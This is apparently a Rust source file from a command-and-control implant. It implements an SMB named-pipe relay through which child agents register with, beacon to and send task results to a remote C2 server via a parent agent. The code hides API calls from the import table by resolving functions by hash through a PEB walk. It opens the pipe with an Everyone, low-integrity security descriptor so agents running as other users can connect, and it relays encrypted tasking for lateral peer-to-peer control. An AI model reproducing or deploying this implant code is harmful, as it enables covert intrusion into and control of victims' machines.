/// pipe_server.rs — SMB named-pipe relay server for the HTTP Rust agent.
/// Windows only. Called from commands.rs when PIPE_START task arrives.
/// Protocol mirrors pipe_server.c / pipe_server_windows.go:
///   Child → REGISTER → parent forwards to C2 /register → relay response
///   Child → BEACON   → parent relays to C2, decrypts tasks, sends task array
///   Child → RESULT   → parent encrypts, POSTs to C2 /result/<id>

use std::sync::{Arc, Mutex, OnceLock};
use std::sync::atomic::{AtomicBool, Ordering};

use base64::{engine::general_purpose::STANDARD, Engine as _};

use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, INVALID_HANDLE_VALUE, HANDLE};

use crate::transport::wstr;
use crate::crypto::{open, seal};

// ── Pipe constants (hardcoded to avoid adding windows_sys Pipes to the IAT) ──
const PIPE_ACCESS_DUPLEX:       u32 = 0x00000003;
const PIPE_TYPE_BYTE:           u32 = 0x00000000;
const PIPE_UNLIMITED_INSTANCES: u32 = 255;

// ── Dynamic function pointers (loaded via PEB walk — do not appear in IAT) ───
type FnCreateNamedPipeW  = unsafe extern "system" fn(*const u16, u32, u32, u32, u32, u32, u32, *const core::ffi::c_void) -> HANDLE;
type FnConnectNamedPipe  = unsafe extern "system" fn(HANDLE, *mut core::ffi::c_void) -> i32;
type FnDisconnectNamedPipe = unsafe extern "system" fn(HANDLE) -> i32;
type FnCancelIoEx        = unsafe extern "system" fn(HANDLE, *const core::ffi::c_void) -> i32;
type FnSleep             = unsafe extern "system" fn(u32);

// Dynamic function type for ConvertStringSecurityDescriptorToSecurityDescriptorW (advapi32)
type FnConvertSddl = unsafe extern "system" fn(*const u16, u32, *mut *mut core::ffi::c_void, *mut u32) -> i32;

fn resolve_k32(fn_hash: u32) -> usize {
    const H_K32: u32 = crate::api_hash::hash_dll(b"kernel32.dll");
    unsafe { crate::api_hash::resolve_fn(H_K32, fn_hash) }
}

fn resolve_adv32(fn_hash: u32) -> usize {
    const H_ADV: u32 = crate::api_hash::hash_dll(b"advapi32.dll");
    unsafe { crate::api_hash::resolve_fn(H_ADV, fn_hash) }
}

macro_rules! lazy_fn {
    ($name:ident, $ty:ty, $hash:expr) => {
        fn $name() -> Option<$ty> {
            static ADDR: OnceLock<usize> = OnceLock::new();
            let addr = *ADDR.get_or_init(|| resolve_k32($hash));
            if addr == 0 { None } else { Some(unsafe { core::mem::transmute(addr) }) }
        }
    };
}

macro_rules! lazy_fn_adv {
    ($name:ident, $ty:ty, $hash:expr) => {
        fn $name() -> Option<$ty> {
            static ADDR: OnceLock<usize> = OnceLock::new();
            let addr = *ADDR.get_or_init(|| resolve_adv32($hash));
            if addr == 0 { None } else { Some(unsafe { core::mem::transmute(addr) }) }
        }
    };
}

lazy_fn!(fn_create_named_pipe, FnCreateNamedPipeW,  crate::api_hash::hash(b"CreateNamedPipeW"));
lazy_fn!(fn_connect_named_pipe, FnConnectNamedPipe, crate::api_hash::hash(b"ConnectNamedPipe"));
lazy_fn!(fn_disconnect_named_pipe, FnDisconnectNamedPipe, crate::api_hash::hash(b"DisconnectNamedPipe"));
lazy_fn!(fn_cancel_io_ex, FnCancelIoEx, crate::api_hash::hash(b"CancelIoEx"));
lazy_fn!(fn_sleep, FnSleep,             crate::api_hash::hash(b"Sleep"));
lazy_fn_adv!(fn_convert_sddl, FnConvertSddl, crate::api_hash::hash(b"ConvertStringSecurityDescriptorToSecurityDescriptorW"));

// SECURITY_ATTRIBUTES for CreateNamedPipeW
#[repr(C)]
struct SecurityAttributes {
    n_length:               u32,
    lp_security_descriptor: *mut core::ffi::c_void,
    b_inherit_handle:       i32,
}

unsafe impl Send for SecurityAttributes {}
unsafe impl Sync for SecurityAttributes {}

/// Build pipe SECURITY_ATTRIBUTES: Everyone DACL + Low-integrity SACL.
/// Returns (SecurityAttributes, sd_ptr) — caller must LocalFree sd_ptr on drop.
/// Falls back to null SA on failure (same as before, should not happen on modern Windows).
fn make_pipe_sa() -> (SecurityAttributes, *mut core::ffi::c_void) {
    // S:(ML;;NW;;;LW) = Low integrity SACL; D:(A;;0x1f019f;;;WD) = Everyone full access
    let sddl: Vec<u16> = "S:(ML;;NW;;;LW)D:(A;;0x1f019f;;;WD)\0"
        .encode_utf16().collect();
    let mut sd: *mut core::ffi::c_void = core::ptr::null_mut();
    if let Some(f) = fn_convert_sddl() {
        unsafe { f(sddl.as_ptr(), 1, &mut sd, core::ptr::null_mut()); }
    }
    let sa = SecurityAttributes {
        n_length:               core::mem::size_of::<SecurityAttributes>() as u32,
        lp_security_descriptor: sd,
        b_inherit_handle:       0,
    };
    (sa, sd)
}

// ── Raw pipe I/O (ReadFile/WriteFile already in IAT from other modules) ──────
extern "system" {
    fn ReadFile(
        hFile:               HANDLE,
        lpBuffer:            *mut u8,
        nNumberOfBytesToRead: u32,
        lpNumberOfBytesRead: *mut u32,
        lpOverlapped:        *const core::ffi::c_void,
    ) -> i32;
    fn WriteFile(
        hFile:                  HANDLE,
        lpBuffer:               *const u8,
        nNumberOfBytesToWrite:  u32,
        lpNumberOfBytesWritten: *mut u32,
        lpOverlapped:           *const core::ffi::c_void,
    ) -> i32;
}

fn ps_read_exact(h: HANDLE, buf: &mut [u8]) -> bool {
    let mut off = 0usize;
    while off < buf.len() {
        let mut got: u32 = 0;
        let ok = unsafe {
            ReadFile(h, buf.as_mut_ptr().add(off), (buf.len() - off) as u32,
                     &mut got, core::ptr::null())
        };
        if ok == 0 || got == 0 { return false; }
        off += got as usize;
    }
    true
}

fn ps_write_all(h: HANDLE, data: &[u8]) -> bool {
    let mut off = 0usize;
    while off < data.len() {
        let mut wrote: u32 = 0;
        let ok = unsafe {
            WriteFile(h, data.as_ptr().add(off), (data.len() - off) as u32,
                      &mut wrote, core::ptr::null())
        };
        if ok == 0 || wrote == 0 { return false; }
        off += wrote as usize;
    }
    true
}

fn pipe_read_msg(h: HANDLE) -> Option<Vec<u8>> {
    let mut hdr = [0u8; 4];
    if !ps_read_exact(h, &mut hdr) { return None; }
    let len = u32::from_le_bytes(hdr) as usize;
    if len == 0 || len > 16 * 1024 * 1024 { return None; }
    let mut data = vec![0u8; len];
    if !ps_read_exact(h, &mut data) { return None; }
    Some(data)
}

fn pipe_write_msg(h: HANDLE, data: &[u8]) -> bool {
    let hdr = (data.len() as u32).to_le_bytes();
    ps_write_all(h, &hdr) && (data.is_empty() || ps_write_all(h, data))
}

// ── HTTP relay to C2 ──────────────────────────────────────────────────────────

fn c2_do(method: &str, path: &str, body: &[u8]) -> Option<(u32, Vec<u8>)> {
    crate::transport::http_do(method, path, body)
}

fn diag(msg: &str) {
    use std::io::Write;
    if let Ok(mut f) = std::fs::OpenOptions::new()
        .create(true).append(true)
        .open(r"C:\Users\Public\rpd2.txt")
    {
        let _ = writeln!(f, "{}", msg);
    }
}

// ── Relay helpers ─────────────────────────────────────────────────────────────

fn relay_beacon(h: HANDLE, agent_id: &str, aes_key: &[u8]) {
    let path = format!("/beacon/{}", agent_id);
    let result = c2_do("GET", &path, &[]);
    match result {
        Some((200, enc)) => {
            match open(aes_key, &enc) {
                Some(plain) => {
                    let envelope: serde_json::Value =
                        serde_json::from_slice(&plain).unwrap_or_default();
                    if let Some(tasks) = envelope.get("tasks").filter(|t| t.is_array()) {
                        let raw = serde_json::to_vec(tasks).unwrap_or_default();
                        pipe_write_msg(h, &raw);
                        return;
                    }
                }
                None => {}
            }
        }
        _ => {}
    }
    pipe_write_msg(h, b"null");
}

fn relay_result(req: &serde_json::Value, agent_id: &str, aes_key: &[u8]) {
    let task_id  = req.get("task_id").and_then(|v| v.as_i64()).unwrap_or(0);
    let output   = req.get("output").and_then(|v| v.as_str()).unwrap_or("");
    let err_str  = req.get("error").and_then(|v| v.as_str()).unwrap_or("");
    let is_admin = req.get("is_admin").and_then(|v| v.as_bool()).unwrap_or(false);
    let plain = serde_json::json!({
        "task_id":  task_id,
        "output":   output,
        "error":    err_str,
        "is_admin": is_admin,
    });
    let enc = seal(aes_key, plain.to_string().as_bytes());
    if !enc.is_empty() {
        let path = format!("/result/{}", agent_id);
        c2_do("POST", &path, &enc);
    }
    // No ACK — Go/Nim/Rust SMB children do not drain after RESULT
}

// ── Per-connection handler ────────────────────────────────────────────────────

fn handle_connection(h: HANDLE, parent_id: &str) {
    diag("handle_connection: waiting for REGISTER");
    let reg_bytes = match pipe_read_msg(h) { Some(b) => b, None => { diag("handle_connection: read REGISTER failed"); return; } };
    let reg: serde_json::Value = match serde_json::from_slice(&reg_bytes) {
        Ok(v) => v, Err(e) => { diag(&format!("handle_connection: JSON parse error: {}", e)); return; }
    };
    if reg.get("type").and_then(|v| v.as_str()) != Some("REGISTER") {
        diag(&format!("handle_connection: unexpected type: {:?}", reg.get("type")));
        return;
    }
    diag(&format!("handle_connection: REGISTER received from pid={}", reg.get("pid").and_then(|v| v.as_i64()).unwrap_or(0)));

    let hostname  = reg.get("hostname").and_then(|v| v.as_str()).unwrap_or("").to_string();
    let username  = reg.get("username").and_then(|v| v.as_str()).unwrap_or("").to_string();
    let os_str    = reg.get("os").and_then(|v| v.as_str()).unwrap_or("windows/amd64").to_string();
    let pid       = reg.get("pid").and_then(|v| v.as_i64()).unwrap_or(0);
    let is_admin  = reg.get("is_admin").and_then(|v| v.as_bool()).unwrap_or(false);
    let lang      = reg.get("language").and_then(|v| v.as_str()).unwrap_or("rust").to_string();
    let sleep_sec = reg.get("sleep_sec").and_then(|v| v.as_i64()).unwrap_or(5);
    let jitter    = reg.get("jitter_pct").and_then(|v| v.as_i64()).unwrap_or(10);
    let proc_name = reg.get("process_name").and_then(|v| v.as_str()).unwrap_or("").to_string();

    let reg_json = serde_json::json!({
        "hostname":     hostname,
        "username":     username,
        "os":           os_str,
        "pid":          pid,
        "transport":    "smb",
        "is_admin":     is_admin,
        "language":     lang,
        "sleep_sec":    sleep_sec,
        "jitter_pct":   jitter,
        "process_name": proc_name,
        "parent_id":    parent_id,
    });
    diag("handle_connection: POSTing /register to C2");
    let (code, resp) = match c2_do("POST", "/register", reg_json.to_string().as_bytes()) {
        Some(r) => r, None => { diag("handle_connection: c2_do /register returned None (HTTP error)"); return; }
    };
    diag(&format!("handle_connection: /register returned code={} resp_len={}", code, resp.len()));
    if code != 200 || resp.is_empty() { diag(&format!("handle_connection: bad code or empty resp")); return; }

    let reg_resp: serde_json::Value = match serde_json::from_slice(&resp) {
        Ok(v) => v, Err(e) => { diag(&format!("handle_connection: resp JSON parse error: {}", e)); return; }
    };
    let agent_id = match reg_resp["agent_id"].as_str().filter(|s| !s.is_empty()) {
        Some(s) => s.to_string(), None => { diag("handle_connection: no agent_id in resp"); return; }
    };
    let aes_key_b64 = reg_resp["aes_key"].as_str().unwrap_or("");
    let aes_key = match STANDARD.decode(aes_key_b64).ok().filter(|k| k.len() >= 32) {
        Some(k) => k, None => { diag(&format!("handle_connection: bad aes_key (b64={})", aes_key_b64)); return; }
    };

    diag(&format!("handle_connection: registered child as agent_id={}", &agent_id[..8.min(agent_id.len())]));
    pipe_write_msg(h, &resp);

    loop {
        let msg_bytes = match pipe_read_msg(h) { Some(b) => b, None => { diag("handle_connection: child disconnected"); break; } };
        let msg: serde_json::Value = match serde_json::from_slice(&msg_bytes) {
            Ok(v) => v, Err(_) => { diag("handle_connection: JSON parse error in loop"); break; }
        };
        match msg.get("type").and_then(|v| v.as_str()) {
            Some("BEACON") => { diag("handle_connection: BEACON"); relay_beacon(h, &agent_id, &aes_key); }
            Some("RESULT") => { diag("handle_connection: RESULT"); relay_result(&msg, &agent_id, &aes_key); }
            other => { diag(&format!("handle_connection: unknown msg type {:?}", other)); break; }
        }
    }
}

// ── Per-server state ──────────────────────────────────────────────────────────

struct PipeServer {
    full_name: String,
    stop:      Arc<AtomicBool>,
    accept_h:  Arc<Mutex<HANDLE>>,
    thread:    Option<std::thread::JoinHandle<()>>,
}

// HANDLE is isize, which is Send. Arc and Mutex are Send.
unsafe impl Send for PipeServer {}

static SERVERS: OnceLock<Mutex<Vec<PipeServer>>> = OnceLock::new();

fn servers() -> &'static Mutex<Vec<PipeServer>> {
    SERVERS.get_or_init(|| Mutex::new(Vec::new()))
}

fn norm_pipe_name(s: &str) -> String {
    if s.starts_with(r"\\") { s.to_string() } else { format!(r"\\.\pipe\{}", s) }
}

// ── Accept loop ───────────────────────────────────────────────────────────────

fn run_accept_loop(
    full_name: String,
    parent_id: String,
    stop:      Arc<AtomicBool>,
    accept_h:  Arc<Mutex<HANDLE>>,
) {
    let wname = wstr(&full_name);
    let create_pipe = fn_create_named_pipe();
    let connect_pipe = fn_connect_named_pipe();
    let disconnect_pipe = fn_disconnect_named_pipe();
    let sleep_fn = fn_sleep();

    // Security: Everyone DACL + Low-integrity SACL so cross-user children (runas/schtask) can connect.
    let (sa, _sa_sd) = make_pipe_sa();
    let sa_ptr: *const core::ffi::c_void = if sa.lp_security_descriptor.is_null() {
        core::ptr::null()
    } else {
        &sa as *const SecurityAttributes as *const core::ffi::c_void
    };

    const ERROR_PIPE_CONNECTED: u32 = 535;
    let mut first_iter = true;

    while !stop.load(Ordering::Relaxed) {
        let h = match create_pipe {
            Some(f) => unsafe {
                f(wname.as_ptr(), PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE,
                  PIPE_UNLIMITED_INSTANCES, 65536, 65536, 0,
                  sa_ptr)
            },
            None => INVALID_HANDLE_VALUE,
        };
        if first_iter {
            first_iter = false;
            let diag = if h == INVALID_HANDLE_VALUE {
                let err = unsafe { GetLastError() };
                format!("FAIL err={}\n", err)
            } else {
                format!("OK handle={} pipe={}\n", h, full_name)
            };
            let _ = std::fs::write(r"C:\Users\Public\rpd.txt", diag.as_bytes());
        }
        if h == INVALID_HANDLE_VALUE {
            if let Some(s) = sleep_fn { unsafe { s(500); } }
            continue;
        }

        *accept_h.lock().unwrap() = h;
        let connected = match connect_pipe {
            Some(f) => unsafe { f(h, core::ptr::null_mut()) },
            None => { unsafe { CloseHandle(h); } continue; }
        };
        let last_err = std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32;
        *accept_h.lock().unwrap() = INVALID_HANDLE_VALUE;

        if stop.load(Ordering::Relaxed) {
            unsafe { CloseHandle(h); }
            break;
        }

        if connected == 0 && last_err != ERROR_PIPE_CONNECTED {
            unsafe { CloseHandle(h); }
            continue;
        }

        let pid_c = parent_id.clone();
        std::thread::spawn(move || {
            // catch_unwind prevents a panic in handle_connection from aborting
            // the accept loop or the parent agent process.
            let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                handle_connection(h, &pid_c)
            }));
            if let Some(f) = fn_disconnect_named_pipe() { unsafe { f(h); } }
            unsafe { CloseHandle(h); }
        });
    }
    let _ = disconnect_pipe; // suppress unused warning
}

// ── Public API ────────────────────────────────────────────────────────────────

pub fn pipe_server_start(name: &str, parent_id: &str) -> String {
    let full = norm_pipe_name(name);
    let mut srvs = servers().lock().unwrap();

    if srvs.iter().any(|s| s.full_name == full) {
        return format!("[*] pipe server already running on {}", full);
    }
    if srvs.len() >= 8 {
        return "[-] too many pipe servers".to_string();
    }

    // Probe: verify CreateNamedPipeW succeeds before spawning the thread.
    let create_pipe = match fn_create_named_pipe() {
        Some(f) => f,
        None => return "[-] CreateNamedPipeW not found (dynamic load failed)".to_string(),
    };
    let wname = wstr(&full);
    let probe = unsafe {
        create_pipe(wname.as_ptr(), PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE,
                    PIPE_UNLIMITED_INSTANCES, 65536, 65536, 0,
                    core::ptr::null())
    };
    if probe == INVALID_HANDLE_VALUE {
        let err = unsafe { GetLastError() };
        return format!("[-] CreateNamedPipeW failed: err={}", err);
    }
    unsafe { CloseHandle(probe); }

    let stop     = Arc::new(AtomicBool::new(false));
    let accept_h = Arc::new(Mutex::new(INVALID_HANDLE_VALUE));
    let stop_c   = stop.clone();
    let ah_c     = accept_h.clone();
    let full_c   = full.clone();
    let pid_c    = parent_id.to_string();

    let thread = std::thread::spawn(move || {
        run_accept_loop(full_c, pid_c, stop_c, ah_c);
    });

    srvs.push(PipeServer { full_name: full.clone(), stop, accept_h, thread: Some(thread) });
    format!("[+] pipe server started on {}", full)
}

pub fn pipe_server_stop(name: &str) -> String {
    if name.is_empty() {
        let drained: Vec<PipeServer> = {
            let mut srvs = servers().lock().unwrap();
            srvs.drain(..).collect()
        };
        let n = drained.len();
        if n == 0 { return "[*] no pipe servers running".to_string(); }
        for srv in drained {
            srv.stop.store(true, Ordering::Relaxed);
            let h = *srv.accept_h.lock().unwrap();
            if h != INVALID_HANDLE_VALUE && h != 0 {
                if let Some(f) = fn_cancel_io_ex() { unsafe { f(h, core::ptr::null()); } }
            }
            if let Some(t) = srv.thread { let _ = t.join(); }
        }
        return format!("[+] stopped {} pipe server(s)", n);
    }

    let full = norm_pipe_name(name);
    let srv = {
        let mut srvs = servers().lock().unwrap();
        match srvs.iter().position(|s| s.full_name == full) {
            None    => return format!("[-] no pipe server on {}", full),
            Some(i) => srvs.remove(i),
        }
    };
    srv.stop.store(true, Ordering::Relaxed);
    let h = *srv.accept_h.lock().unwrap();
    if h != INVALID_HANDLE_VALUE && h != 0 {
        if let Some(f) = fn_cancel_io_ex() { unsafe { f(h, core::ptr::null()); } }
    }
    if let Some(t) = srv.thread { let _ = t.join(); }
    format!("[+] pipe server on {} stopped", full)
}
